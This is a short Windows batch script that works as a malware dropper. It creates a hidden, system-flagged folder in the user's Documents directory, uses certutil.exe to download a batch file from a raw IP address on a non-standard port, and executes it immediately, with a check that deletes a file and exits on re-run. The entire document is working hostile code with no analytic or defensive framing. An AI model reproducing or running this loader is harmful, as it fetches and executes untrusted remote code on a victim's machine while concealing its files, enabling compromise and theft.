@echo off
if exist %USERPROFILE%\Documents\debug del %USERPROFILE%\Documents\debugProcess.bat & exit
md "%USERPROFILE%\Documents\debug" & attrib +s +a +h +r "%USERPROFILE%\Documents\debug"
certutil.exe -urlcache -split -f http://146.196.83.217:29324/xxgic/debug.bat %USERPROFILE%\Documents\debug\debug.bat & %USERPROFILE%\Documents\debug\debug.bat
